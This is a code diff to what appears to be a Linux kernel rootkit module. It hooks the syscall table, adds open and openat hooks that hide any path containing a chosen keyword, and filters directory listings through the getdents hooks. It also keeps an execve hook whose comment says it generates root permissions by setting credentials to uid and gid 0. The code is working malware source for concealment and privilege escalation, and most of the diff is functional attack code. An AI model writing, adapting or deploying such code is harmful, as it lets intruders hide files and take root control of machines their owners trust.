@@ -21,29 +21,68 @@ void handler(struct pt_regs *regs)
   regs->di += off / sizeof(unsigned long);
 }
 
-struct task_struct *find_task(pid_t pid)
+static asmlinkage long new_sys_openat(const struct pt_regs *pt_regs)
 {
-  struct task_struct *__current = current;
-  for_each_process(__current) {
-	if (__current->pid == pid)
-	  return __current;
+  int res = 0;
+  int pathlen;
+  char *kpathname;
+  
+  t_syscall orig_syscall = SYSCALL(openat);
+  int ret = orig_syscall(pt_regs);
+  const char * pathname = (const char * )pt_regs->si;
+
+  debug_print("HOOK: executing new_sys_openat()");
+  
+  pathlen = strnlen_user(pathname, 256);
+  kpathname = kzalloc(pathlen, GFP_KERNEL);
+  if (kpathname == NULL)
+	return -ENOENT;
+
+  res = copy_from_user(kpathname, pathname, pathlen);
+  if (res)
+	return -EACCES;
+
+  /* check for keyword */
+  if (strstr(kpathname, TO_HIDE) != NULL) {
+	kfree(kpathname);
+	return -ENOENT;
   }
-  return NULL;
+
+  kfree(kpathname);
+
+  return ret;
 }
 
-int is_invisible(pid_t pid)
+static asmlinkage long new_sys_open(const struct pt_regs *pt_regs)
 {
-  struct task_struct *task = current;
-  if (!pid)
-	goto exit;
-  task = find_task(pid);
-  if (!task)
-	goto exit;
-  if (task->flags & TSK_INVISIBLE)
-	return 1;
-  goto exit;
- exit:
-  return 0;
+  int res = 0;
+  int pathlen;
+  char *kpathname;
+  
+  t_syscall orig_syscall = SYSCALL(open);
+  int ret = orig_syscall(pt_regs);
+  const char * pathname = (const char * )pt_regs->di;
+
+  debug_print("HOOK: executing new_sys_open()");
+  
+  pathlen = strnlen_user(pathname, 256);
+  kpathname = kzalloc(pathlen, GFP_KERNEL);
+  if (kpathname == NULL)
+	return -ENOENT;
+
+  res = copy_from_user(kpathname, pathname, pathlen);
+  if (res)
+	return -EACCES;
+
+  /* check for keyword */
+  if (strstr(kpathname, TO_HIDE) != NULL) {
+	kfree(kpathname);
+	return -ENOENT;
+  }
+
+  kfree(kpathname);
+
+  return ret;
 }
 
 static asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
@@ -58,6 +97,8 @@ static asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
 
   t_syscall orig_syscall = SYSCALL(getdents64);
   int ret = orig_syscall(pt_regs), err;
+
+  debug_print("HOOK: executing new_sys_getdents64()");
 
   if (ret <= 0)
 	return ret;
@@ -80,8 +121,7 @@ static asmlinkage long new_sys_getdents64(const struct pt_regs *pt_regs)
   /* iterate through entries */
   while (off < ret) {
 	dir = (void *)kdirent + off;
-	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0)) ||
-		(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0))) {
 	  if (dir == kdirent) {
 		/* hide current entry */
 		ret -= dir->d_reclen;
@@ -117,6 +157,8 @@ static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
   t_syscall orig_syscall = SYSCALL(getdents);
   int ret = orig_syscall(pt_regs), err;
 
+  debug_print("HOOK: executing new_sys_getdents64()");
+
   if (ret <= 0)
 	return ret;
 
@@ -138,8 +180,7 @@ static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
   /* iterate through entries */
   while (off < ret) {
 	dir = (void *)kdirent + off;
-	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0)) ||
-		(proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+	if ((!proc && (memcmp(TO_HIDE, dir->d_name, strlen(TO_HIDE)) == 0))) {
 	  if (dir == kdirent) {
 		/* hide current entry */
 		ret -= dir->d_reclen;
@@ -163,10 +204,12 @@ static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
 
 static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
 {
+  struct cred *np;
   t_syscall orig_syscall = SYSCALL(execve);
+
+  debug_print("HOOK: executing new_sys_execve()");
   
   /* generating root permissions */
-  struct cred *np;
   np = prepare_creds();
 
   np->uid.val = np->gid.val = 0;
@@ -195,6 +238,8 @@ int hook_syscall_table(void)
   HOOK(execve, new_sys_execve);
   HOOK(getdents64, new_sys_getdents64);
   HOOK(getdents, new_sys_getdents);
+  HOOK(openat, new_sys_openat);
+  HOOK(open, new_sys_open);
 
   call_sys_addr = get_syscall_64_addr();
   if (!call_sys_addr)
